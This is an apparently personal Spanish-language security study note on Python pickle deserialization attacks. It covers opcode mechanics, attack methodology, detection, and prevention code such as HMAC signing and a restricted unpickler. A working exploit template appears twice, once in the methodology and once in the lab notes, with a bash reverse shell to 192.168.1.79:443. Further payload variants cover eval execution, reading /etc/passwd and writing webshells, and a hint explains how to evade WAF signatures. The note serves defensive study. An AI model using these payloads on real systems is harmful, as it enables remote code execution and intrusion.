---
aliases: ["Deserialización Pickle", "DES-Pickle Attack", "Python Pickle Vulnerability", "Pickle RCE"]
tags:
  - sec/web
  - sec/web/deserializacion
  - sec/lenguajes/python
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Ataques de Deserialización]]"
  - "[[Ataque de Deserialización Yaml]]"
  - "[[OS Command Injection]]"
  - "[[Server-Side Request Forgery (SSRF)]]"
  - "[[Log Poisoning]]"
fuente: "https://docs.python.org/3/library/pickle.html"
---

# Ataque de Deserialización Pickle (DES-Pickle)

Un ataque de **Deserialización Pickle** (**DES-Pickle**) ocurre en aplicaciones Python que usan el módulo `pickle` para serializar y deserializar objetos y deserializan datos controlados por el atacante. La deserialización con `pickle.load()` no es "leer datos": es **ejecutar un programa bytecode sobre una pila** — el propio formato fue diseñado como lenguaje de máquina, y su opcode `REDUCE` invoca cualquier callable. Un payload bien formado equivale a ejecución remota de código (RCE) con la sola deserialización, sin que la aplicación "haga nada" con el objeto resultante.

> [!info] ¿Qué es `pickle`?
> El mulo `pickle` implementa protocolos binarios (protocolos 0–5) para serializar y deserializar estructuras de objetos de Python. La serialización convierte un objeto en un flujo de bytes para almacenarlo o transmitirlo; la deserialización reconstruye el objeto. La documentación oficial lo dice sin rodeos: **`pickle` no es seguro contra datos maliciosos** — nunca debe deserializarse datos de origen no confiable.

> [!warning] El error conceptual más común
> "Solo deserializo lo que guardé yo en mi propia base de datos / caché / cola". El vector realista es que **cualquier otra vulnerabilidad que permita escribir en ese almacenamiento** (SQLi contra la tabla de sesiones, SSRF contra Memcached/Redis sin autenticación, [[Log Poisoning]], escritura en disco) reinyecta un pickle controlado por ti en el `pickle.load()` de la aplicación. La confianza debe derivarse de la **integridad firmada** del blob, no de su procedencia supuesta.

## Mecánica: pickle es una VM de pila

`pickle.loads()` ejecuta una secuencia de **opcodes** sobre una pila de operandos. Eso es lo que permite que un "dato" invoque funciones:

| Opcode | Binario | Qué hace |
|---|---|---|
| `PROTO` | `\x80` | Fija la versión del protocolo |
| `FRAME` | `\x95` | buffering del flujo (protocolo ≥4) |
| `EMPTY_LIST` / `EMPTY_TUPLE` / `EMPTY_DICT` | `]` `)` `}` | Push de contenedores vacíos |
| `MARK` | `(` | Marcador de posición en la pila |
| `GLOBAL` | `c` | **Push de un objeto global por nombre: `c<module>\n<name>\n`** — resuelve `os.system` |
| `STACK_GLOBAL` | `\x93` | Igual pero toma módulo y nombre de la pila (ofusca el payload) |
| `BINUNICODE` / `SHORT_BINSTRING` | `X` / `U` | Push de cadenas (argumentos) |
| `INT` / `BININT1` / `BININT2` | `I` / `K` / `M` | Push de enteros |
| **`REDUCE`** | `R` | **Pop function + args; ejecuta `function(*args)` y push del resultado** — el opcode de RCE |
| `NEWOBJ` | `\x81` | `cls.__new__(cls, *args)` |
| `BUILD` | `b` | Aplica `__setstate__`/dict al objeto en la cima |
| `APPEND` / `SETITEM` | `a` / `s` | Mutación de contenedores |
| `STOP` | `.` | Fin del stream; devuelve el tope de la pila |

Un payload mínimo clásico escrito en pickle opcodes crudos:

```
cposix                    # GLOBAL: módulo 'posix' (o 'os')
system                    #        función 'system'
(S'id > /tmp/pwned'       # SHORT_BINSTRING: argumento
tR                        # TUPLE + REDUCE: system('id > /tmp/pwned')
.                         # STOP
```

Al ejecutar `pickle.loads()` sobre esos bytes, Python **llama a `system()` durante el parseo**. No hay fase de "uso posterior" del objeto: el daño ocurre dentro del `load`.

### `__reduce__`: el puente entre objetos y opcodes

Cuando serializas un objeto, `pickle` pregunta a su `__reduce__()` cómo reconstruirlo. Si devuelve `(callable, args)`, el stream generado contiene exactamente `GLOBAL` + argumentos + `REDUCE` — es decir, la **deserialización** ejecutará `callable(*args)`. El atacante no necesita generar opcodes a mano: basta con definir una clase con `__reduce__` y dejar que `pickle.dumps()` produzca el payload.

> [!tip] La cadena inversa
> `__reduce__` es una función legítima y útil (es el mecanismo oficial de reconstrucción). El ataque no es un bug de `pickle`: es la decisión de aplicar ese mecanismo de ejecución a datos no confiables. Por eso no existe "parche de sintaxis": la única defensa es no deserializar entradas sin firmar.

## Metodología de ataque

1. **Localizar el `load`**: buscar `pickle.load(s)`, `pickle.loads(...)`, `joblib.load`, `numpy.load(allow_pickle=True)`, `shelve`, cachés de sesión, mensajes de cola, cookies codificadas en base64 con blob binario, artefactos de ML (`.pkl`, `.joblib`, `.npy`).
2. **Identificar el transporte**: base64 (lo más común en cookies/parámetros), hex, raw bytes en multipart, formato de protocolo 0 (texto ASCII legible: `cos\nsystem\n...` — señal inmediata).
3. **Generar el payload** con la plantilla `__reduce__` de abajo (o herramientas como `pickletools` para análisis y `malicious-pickle`/`pickle-endorser` para generación).
4. **Entregar** por el canal descubierto y observar efectos out-of-band (fichero creado, DNS/HTTP callback, reverse shell). Para lectura de ficheros `print`, un `subprocess.check_output` que devuelva el contenido por la respuesta es más limpio que una shell.
5. **Blind/extract**: si no hay salida, usar efectos temporales (`time.sleep(N)` con `subprocess`) para confirmar ejecución por timing.

### Plantilla de exploit estándar

```python
import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        # pickle.dumps genera: GLOBAL os.system + arg + REDUCE
        # Al deserializar, se ejecuta el comando del argumento.
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.1.79/443 0>&1"',))

if __name__ == '__main__':
    # pickle.dumps serializa el objeto Exploit en un flujo de bytes.
    # binascii.hexlify lo pasa a hexadecimal (usar base64.b64encode si el canal es base64).
    print(binascii.hexlify(pickle.dumps(Exploit())))
```

Variantes de `__reduce__` por objetivo:

| Objetivo | `return` |
|---|---|
| Comando simple | `(os.system, ('id',))` |
| Capturar salida en la respuesta | `(subprocess.check_output, (['cat','/etc/passwd'],))` |
| Reverse shell | `(os.system, ('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',))` |
| Ejecución vía Python | `(eval, ("__import__('os').popen('id').read()",))` |
| Escritura de fichero (webshell) | `(open, ('/var/www/html/shell.php','w'))` + `BUILD` (requiere ajuste; más limpio: `os.system('echo ... > shell.php')`) |
| Lectura de fichero en 1 sola línea | `(subprocess.getoutput, ('cat /flag',))` |

### Análisis de payloads (cuando hay un blob y no sabes qué hace)

```bash
echo '<blob_base64>' | base64 -d > payload.bin
python3 -m pickletools payload.bin      # desensamblado legible del programa pickle
python3 -c "import pickletools,sys; pickletools.dis(open('payload.bin','rb'))"
```

`pickletools.dis` muestra los opcodes y la función global invocada — es la forma segura de analizar un pickle sospechoso **sin ejecutarlo** (nunca usar `pickle.loads` para "ver qué es").

## Detección

- Tráfico: blobs base64/hex de longitud variable en cookies, parámetros o bodies que no corresponden a JSON/XML conocidos. El formato protocolo 0 deja cadenas `c<modulo>\n<funcion>\n` visibles tras decodificar.
- Errores: `UnpicklingError`, `AttributeError` de módulos extraños, `ModuleNotFoundError` de módulos que la app nunca usa (`posix`, `subprocess` apareciendo desde la base de datos = intento de ataque).
- Código: `pickle.load` sobre cualquier fuente externa; `numpy.load` sin `allow_pickle=False` (default desde NumPy 1.16.3); modelos ML cargados de uploads.
- WAFs/IDS: firmas sobre `\x80\x03` (PROTO 3), `cos\nsystem` y `cposix\nsystem` son habituales; evadirlas requiere `STACK_GLOBAL` + ofuscare módulo (`__builtin__\ninput`) — relevante para el defensor: no confíes solo en firmas.

## Impacto

RCE completa en el contexto del proceso Python (usuario del servicio web). Cadenas clásicas: lectura de ficheros (`/etc/passwd`, claves, `.env`), escalada local, reverse shell, y en contenedores acceso a la red interna. Si el proceso corre como root o con caps amplias, es compromiso total del host. En pipelines de ML es particularmente grave: un modelo `.pkl` descargado de un hub malicioso ejecuta código al cargarse —supply chain–.

## Prevención (con código)

**1. Regla número uno: serializar solo con formatos de datos, no de objetos.**

```python
import json

# SEGURO: JSON solo representa datos primitivos — no puede invocar funciones
blob = json.dumps({"user": "wiener", "role": "user"})
data = json.loads(blob)      # jamás ejecuta código
```

> [!warning] Sobre "YAML también es seguro"
> La vieja nota decía que alternativas seguras eran "JSON o YAML". **JSON sí; YAML solo con `yaml.safe_load`** — `yaml.load()` es RCE (ver [[Ataque de Deserialización Yaml]]). Corregido aquí y en esa nota.

**2. Si inevitablemente necesitas objetos Python, firma el blob con HMAC y verifica ANTES de cargar:**

```python
import pickle, hmac, hashlib, os

SECRET = os.urandom(32)   # en producción, gestor de secretos

def dump_signed(obj) -> bytes:
    raw = pickle.dumps(obj, protocol=4)
    sig = hmac.new(SECRET, raw, hashlib.sha256).digest()
    return sig + raw

def load_signed(blob: bytes):
    sig, raw = blob[:32], blob[32:]
    if not hmac.compare_digest(sig, hmac.new(SECRET, raw, hashlib.sha256).digest()):
        raise ValueError("firma inválida")   # aborta ANTES de pickle.load
    return pickle.loads(raw)
```

El orden importa: **verificar la firma primero, deserializar después**. Si deserializas y luego verificas, el payload ya se ejecutó.

**3. Unpickler restringido (defensa en profundidad, no es suficiente sola):**

```python
import pickle, io

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED = {("builtins", "set"), ("datetime", "datetime")}   # solo lo estrictamente necesario
    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED:
            raise pickle.UnpicklingError(f"global {module}.{name} denegado")
        return super().find_class(module, name)

def safe_loads(data: bytes):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

Advertencia honesta: los RestrictedUnpiklers han tenido bypasses históricos vía `REDUCE` sobre objetos permitidos. Úsalo como capa, no como control único; la firma criptográfica o el formato de datos son el control real.

**4. Higiene de superficie**: no expongas artefactos `.pkl`/`.joblib` en URLs; `numpy.load(..., allow_pickle=False)`; Memcached/Redis con autenticación y en red interna (el "pickle sobre red" de Memcached es el vector que convierte SSRF en RCE).

## Errores comunes

**Atacante:**
1. Ejecutar `pickle.loads` sobre el payload para "probarlo" en local con el objetivo de la app — probar siempre con `pickletools` o con el script aislado.
2. Generar el payload en el protocolo por defecto de Python 3.11+ (protocolo 5) cuando la app usa Python 2 o 3.7 (protocolo ≤4): falla con `UnicodeDecodeError`/`ValueError`. Fijar `protocol=2` o 4 en duda.
3. Olvidar la codificación del canal: si la app hace `base64.b64decode` antes de `loads`, entregar hex puro no llega nunca al parser.
4. Usar `os.system` cuando el output es necesario: usar `subprocess.check_output` para traer la respuesta en el body.

**Defensor (falsas soluciones):**
1. "Valido que el blob sea base64": el payload malicioso también es base64 válido.
2. Blocklist de nombres de módulo en el stream sin firma: se evade con `STACK_GLOBAL`, aliasing de builtins (`__builtin__`) y otros callables.
3. Confiar en que el origen "es interno" (ver el aviso del inicio).
4. Firmar con SHA-256 simple (sin secreto): es una suma de integridad, no autenticación — el atacante recalcula el hash. Debe ser HMAC con secreto o firma asimétrica.

## Cheatsheet

| Tarea | Comando / código |
|---|---|
| Generar payload RCE | `return (os.system, ('cmd',))` en `__reduce__` + `pickle.dumps` |
| Capturar output | `(subprocess.check_output, (['cat','/flag'],))` |
| Desensamblar (seguro) | `python3 -m pickletools payload.bin` |
| Analizar blob base64 | `echo '<b64>' \| base64 -d \| python3 -m pickletools` |
| Formato seguro de datos | `json.dumps` / `json.loads` |
| Firma | HMAC-SHA256, verificar **antes** de `loads` |
| Cargar sin ejecutar | jamás — `loads` ejecuta por diseño |

| Señal | Indicio |
|---|---|
| `cos\nsystem` visible tras base64 | protocolo 0 con REDUCE |
| `\x80\x03` al inicio | PROTO 3 binario |
| Blob en cookie/sesión no firmada | superficie de ataque |
| `pickle.load` + datos de DB/caché | confianza indebida |

## Notas de la práctica

En el laboratorio, por detrás la web está configurada con `pickle`; el problema es que usa la función vulnerable de `pickle.load()` sobre datos de la sesión:

![[Pasted image 20260227192639.png]]

Lo que vamos a hacer es crearnos un archivo `exploit.py`:

```python
import pickle
import os
import binascii

class Exploit(object):
    def __reduce__(self):
        # Este método es llamado por pickle durante la serialización para determinar cómo serializar el objeto.
        # Aquí, se le indica a pickle que, al deserializar, ejecute os.system con el comando especificado.
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.1.79/443 0>&1"',))

if __name__ == '__main__':
    # pickle.dumps serializa el objeto Exploit en un flujo de bytes.
    # binascii.hexlify convierte esos bytes a su representación hexadecimal para facilitar su uso como payload.
    print(binascii.hexlify(pickle.dumps(Exploit())))
```

> [!tip] El método `__reduce__`
> El método mágico `__reduce__` en Python es parte del protocolo de serialización de `pickle`. Cuando `pickle` intenta serializar un objeto, si el objeto tiene un método `__reduce__`, `pickle` lo llama para obtener una tupla que describe cómo reconstruirlo. Esta tupla puede contener una función y sus argumentos, lo que permite la ejecución de código arbitrario si la función y los argumentos son controlados por un atacante. En este exploit, `os.system` es la función y el comando de reverse shell es el argumento.

Lo que podemos observar es un código donde manipulamos `__reduce__`, el cual es una función mediante la cual se pueden ejecutar comandos. Lo que vamos a hacer es ahora imprimir el objeto con `pickle` y además ponerlo en formato hexadecimal para que sea válido:

![[Pasted image 20260227193742.png]]

Como observamos, ya tenemos una carga útil y, si estamos en escucha (nc en la IP/puerto del payload), podemos intentar realizar la conexión al deserializarla en la aplicación.

## Laboratorios y referencias

- PortSwigger Academy — Insecure deserialization (labs multi-lenguaje): https://portswigger.net/web-security/deserialization
- Python docs — `pickle`: https://docs.python.org/3/library/pickle.html ("never unpickle data received from an untrusted or unauthenticated source")
- HackTricks — Pickle deserialization: https://book.hacktricks.xyz/pentesting-web/deserialization#python-pickle
- Máquina VulnHub usada en práctica propia: Cereal 1 — https://www.vulnhub.com/entry/cereal-1,703/ (walkthrough en [[Ataques de Deserialización]])
- Nota relacionada con el mismo patrón de "carga de objetos desde fichero": [[Log Poisoning]]

## Relacionadas

- [[Ataques de Deserialización]] — nota paraguas: gadget chains, comparativa por lenguaje, cadenas POP
- [[Ataque de Deserialización Yaml]] — el hermano peligroso de Python (`yaml.load` vs `safe_load`)
- [[OS Command Injection]] — el mismo resultado (RCE) por vía de inyección de comandos en lugar de objetos
- [[Server-Side Request Forgery (SSRF)]] — SSRF contra Memcached/Redis sin auth = vector de entrega de pickle
- [[Log Poisoning]] — escribir bytes controlados que luego se "cargan" como objetos
